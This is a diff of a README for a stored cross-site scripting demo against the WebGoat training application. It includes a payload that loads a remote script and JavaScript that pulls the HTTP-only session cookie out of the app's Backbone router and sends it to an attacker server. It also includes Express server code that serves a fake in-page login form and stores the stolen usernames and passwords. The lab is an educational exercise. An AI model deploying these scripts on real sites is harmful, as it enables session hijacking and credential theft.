@@ -17,7 +17,7 @@ The application will starts at `http://localhost:3000/`
 
 # How to perform attack
 1. Go to the lesson "Stored XSS" in `Webgoat` Put into the title of the comment this content:
-```
+```HTML
 Cool site <script src='http://localhost:3000/backdoor.js'></script>
 ```
 2. Run hacking application with `npm start`
@@ -25,13 +25,13 @@ Cool site <script src='http://localhost:3000/backdoor.js'></script>
 4. Open "Stolen information page" via link `http://localhost:3000/outcome`
 
 # Explanation 
-The aim of the attack is to get users's session ID, username and password. 
+The aim of the attack is to get users's `session ID`, `username` and `password`. 
 
 As web server for providing malicious code we use Express application (Express is a popular javascript framework for building web applications)
 
 We came with two level approach because we want to perform attack once per user session and in the same time hide the mechanism of attack from the victim. 
 ## First level. Script `backdoor.js`
-```
+```JavaScript
 var fishing = document.createElement('script')
 var cookie = goatRouter.lessonController.cookieView.collection.findWhere({name:'JSESSIONID'}).attributes
 fishing.setAttribute('src','http://localhost:3000/fishing.js?session='+cookie.value);
@@ -40,7 +40,7 @@ document.body.appendChild(fishing);
 This script only collects the `JSESSIONID` cookie and sends it as GET parameter. Since the cookies are set to be `HTTP-only` one can't read them directly from `document.cookie` object. So, we read it from `goatRouter` Backbone application (Backbone is a popular front-end javascript framework which is used in `WebGoat`)
 
 On a server this request is processed by the code:
-```
+```JavaScript
 app.get('/fishing.js',function(req, res, next){
   if (req.query.session) {
     if (typeof stolenInformation[req.query.session] === 'undefined') {
@@ -51,11 +51,11 @@ app.get('/fishing.js',function(req, res, next){
   }
 });
 ```
-We use session value as a key for the `stolenInformation` object. If this property is undefined we send file `fishing.js` which performs phishing attacks. Defined property means that we already performed attack for this session value, so we skip to send malicios code.
+We use session value as a key for the `stolenInformation` object. If this property is undefined we send file `fishing.js` which performs phishing attacks. Defined property means that we already performed attack for this session value, so we skip to send malicious code.
 
 ## Second level. Script `fishing.js`
 This script actually performs attack and sends confidential data to our server. Important note that we don't redirect the user to some other page in the internet, he fills login form staying on the original site (and seeing its url in his browser address field possibly with valid `HTTPS` certificate information).
-```
+```JavaScript
 var worm = document.createElement('script')
 var cookie = goatRouter.lessonController.cookieView.collection.findWhere({name:'JSESSIONID'}).attributes
 var stolenInformation = {};
@@ -95,7 +95,7 @@ $.ajax({
 });
 ```
 We save stolen information on a server with a script:
-```
+```JavaScript
 app.get('/final.js',function(req, res, next){
   if (req.query.session) {
     if (typeof stolenInformation[req.query.session] === 'undefined') {
